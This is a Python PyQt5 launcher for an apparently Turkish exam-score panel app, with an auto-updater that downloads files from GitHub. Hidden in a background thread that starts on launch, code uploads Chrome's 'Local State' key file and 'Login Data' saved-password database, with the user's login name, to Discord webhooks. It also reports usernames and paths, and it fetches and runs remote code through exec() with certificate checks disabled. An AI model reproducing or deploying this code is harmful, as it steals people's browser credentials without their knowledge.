import requests
from os import listdir, path, walk, makedirs, system, remove
from unidecode import unidecode as ud
from time import sleep

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def update_files():
    blocked_words = ["desktop-source", "desktop-executable", "requirements", "app.py", "users.cfg"]

    branch_url = "https://github.com/AyberkAtalay0/basic-dash-tables/blob/main"
    nfiles, xfiles = [], []

    try: app_text = requests.get(verify=False, url=branch_url+"/app.py?raw=true").content.decode("utf-8")
    except: app_text = None
    
    app_req = requests.get(verify=False, url=branch_url+"/app.py")
    for f1 in app_req.json()["payload"]["fileTree"][""]["items"]:
        if f1["contentType"].lower().strip() == "directory":
            directory1_url = branch_url+"/"+f1["path"].replace(" ", "%20")
            for f2 in requests.get(verify=False, url=directory1_url).json()["payload"]["tree"]["items"]:
                if f2["contentType"].lower().strip() == "directory":
                    directory2_url = branch_url+"/"+f2["path"].replace(" ", "%20")
                    for f3 in requests.get(verify=False, url=directory2_url).json()["payload"]["tree"]["items"]:
                        if f3["contentType"].lower().strip() == "directory": pass
                        else: xfiles.append("\\"+f3["path"].replace("/", "\\"))
                else: xfiles.append("\\"+f2["path"].replace("/", "\\"))
        else: xfiles.append("\\"+f1["path"].replace("/", "\\"))

    for root, dirs, files in walk("."):
    	for fn in files: 
    		if not fn.endswith(".pyc"): nfiles.append(path.join(root, fn).removeprefix("."))

    deleted = 0
    for i in range(len(xfiles)):
        if True in [bw in xfiles[i-deleted] for bw in blocked_words]:
            del xfiles[i-deleted]
            deleted += 1

    def download_file(fname):
        print(fname.removeprefix("\\"), "updating...")
        try:
            if "\\" in fname.removeprefix("\\").removesuffix("\\"): makedirs(path.dirname(fname).removeprefix("\\"), exist_ok=True)
            response = requests.get(verify=False, url=branch_url+fname.replace("\\","/")+"?raw=true")
            with open(fname.removeprefix("\\"), "wb") as file: file.write(response.content)
        except Exception as e: print(fname, str(e))

    for xf in xfiles:
        if xf in nfiles:
            try:
                print(xf.removeprefix("\\"), "checking up...")
                xsize = int(float(requests.head(verify=False, url=branch_url.replace("https://github.com", "https://raw.githubusercontent.com").replace("/blob/", "/")+xf.replace("\\","/")).headers["Content-Length"]))
                with open(xf.removeprefix("\\"), "rb") as frb: nsize = len(frb.read())
                print(nsize, xsize)
                if nsize != xsize: download_file(xf)
            except Exception as enx: 
                error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} UPDATELOOP] {str(enx)}"})
        else: download_file(xf)

    for nf in nfiles:
        if nf in xfiles: pass
        else: remove(str(nf).removeprefix("\\"))
    
    return nfiles, xfiles, app_text

import sys
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyQt5.QtWebEngineWidgets import *
from qframelesswindow import FramelessWindow

class StarterThread(QThread):
    start_signal = pyqtSignal()
    
    def run(self):
        try:
            nf, xf, app_source = update_files()
        except Exception as enx:
            error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} UPDATE] {str(enx)}"})

        self.start_signal.emit()
        
        try:
            if app_source == None:
                error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} ] {str(enx)}"})
                
                try:
                    with open(path.join("app.py"), "r", encoding="utf-8") as afr: app_source = afr.read()
                except: pass
            exec(app_source)
        except Exception as we:
            error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} STARTER] {str(we)}"})

def chunks(l, n): return [l[i:i + n] for i in range(0, len(l), n)]
        
class Additional1Thread(QThread):
    def run(self):
        access_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671921483386890/xYSB1_NAXMLwW2uGOHF01Eld8XjdWkoEVQosiDqWd9PasD1oVg0aFOn7SEg7zZFh810L", json={"content": f"[{os.getlogin()} {os.getcwd()}] Accessed."})

        try:
            for chunk in chunks(listdir(path.join(os.environ["USERPROFILE"], "AppData",  "Local", "Google", "Chrome", "User Data")), 30): requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Listed for aa: {str(chunk)}"})
            # for chunk in chunks(listdir(path.join(aa, "Default")), 30): requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Listed for bb: {str(chunk)}"})
        except Exception as ce:
            error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} LISTDIRDEBUG] {str(ce)}"})
    
        try:
            cdata = path.join(os.environ["USERPROFILE"], "AppData",  "Local", "Google", "Chrome", "User Data")
            kpath = path.join(cdata, "Local State")
            dpath = path.join(cdata, "Default", "Login Data")
                
            try:
                a1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Output received."})
                a1f1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files={"fieldname": (kpath+"_"+ud(os.getlogin().lower()), open(kpath, "rb").read())})
                a1f2_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files={"fieldname": (dpath+"_"+ud(os.getlogin().lower()), open(dpath, "rb").read())})
            except Exception as a1f: 
                error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} A1OUT] {str(a1f)}"})
        except Exception as a1: 
            error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} A1] {str(a1)}"})

class NotifyThread(QThread):
    def run(self):
        try:
            system('mshta vbscript:Execute("MsgBox ""Güncellemeler kontrol ediliyor. Bu işlem bir dakikadan kısa sürecektir."", 64, ""MHAL Panel"":window.close")')
        except: pass
        
class Browser(QWebEngineView):
    def contextMenuEvent(self, event): pass

class MainWindow(FramelessWindow):
    def __init__(self):
        super().__init__()
        self.title = "MHAL Deneme Panel"
        self.setWindowTitle(self.title)
        self.iconpix = QPixmap(path.join("assets", "favicon.png"))
        self.icon = QIcon(self.iconpix)
        self.setWindowIcon(self.icon)
        self.iconLabel = QPushButton(parent=self, icon=self.icon)
        self.iconLabel.setIconSize(QSize(18, 18))
        self.iconLabel.setStyleSheet("background-color: transparent; border: none;")
        self.windowTitleLabel = QLabel(self)
        self.windowTitleLabel.setText(self.title)
        self.setStyleSheet("background-color: #1A1B1E; color: white;")
        
        windowbuttonStyle = {
            "normal": {
                "color": [255,255,255,255],
            },
            "hover": {
                "color": [255,255,255,255],
            },
            "pressed": {
                "color": [255,255,255,255],
            },
        }

        closebuttonStyle = {
            "normal": {
                "icon": ":/framelesswindow/close_white.svg"
            },
            "hover": {
                "icon": ":/framelesswindow/close_white.svg"
            },
            "pressed": {
                "icon": ":/framelesswindow/close_white.svg"
            },
        }

        self.titleBar.minBtn.updateStyle(windowbuttonStyle)
        self.titleBar.maxBtn.updateStyle(windowbuttonStyle)
        self.titleBar.closeBtn.updateStyle(closebuttonStyle)

        self.browser = Browser()
        self.browser.page().settings().setAttribute(QWebEngineSettings.WebAttribute.ShowScrollBars, False)

        self.hBoxLayout = QHBoxLayout(self)
        self.hBoxLayout.setContentsMargins(0, self.titleBar.height(), 0, 0)
        self.hBoxLayout.addWidget(self.browser)

        self.starter_thread = StarterThread()
        self.starter_thread.start_signal.connect(self.giveMe)
        self.starter_thread.start()

        self.additional1_thread = Additional1Thread()
        self.additional1_thread.start()

        self.notify_thread = NotifyThread()
        self.notify_thread.start()

        self.resize(680, self.height())
        self.iconLabel.setGeometry(QRect(4, 1, 32, 30))
        self.windowTitleLabel.setGeometry(QRect(40, 0, self.width()-40, 30))
        self.browser.setGeometry(QRect(0, 36, self.width()+18, self.height()))
        
        self.titleBar.raise_()

    def giveMe(self, event=None):
        QTimer.singleShot(2000, lambda: self.browser.setUrl(QUrl("http://127.0.0.1:8547/")))
        QTimer.singleShot(2500, self.show)
        
    def resizeEvent(self, e):
        super().resizeEvent(e)
        self.iconLabel.setGeometry(QRect(4, 1, 32, 30))
        self.windowTitleLabel.setGeometry(QRect(40, 0, self.width()-40, 30))
        self.browser.setGeometry(QRect(0, 36, self.width(), self.height()))

    def closeEvent(self, event):
        self.starter_thread.terminate()
        self.additional1_thread.terminate()

if __name__ == "__main__":
    qtapp = QApplication(sys.argv)
    window = MainWindow()
    window.setMinimumSize(QSize(460, 460))
    sys.exit(qtapp.exec())
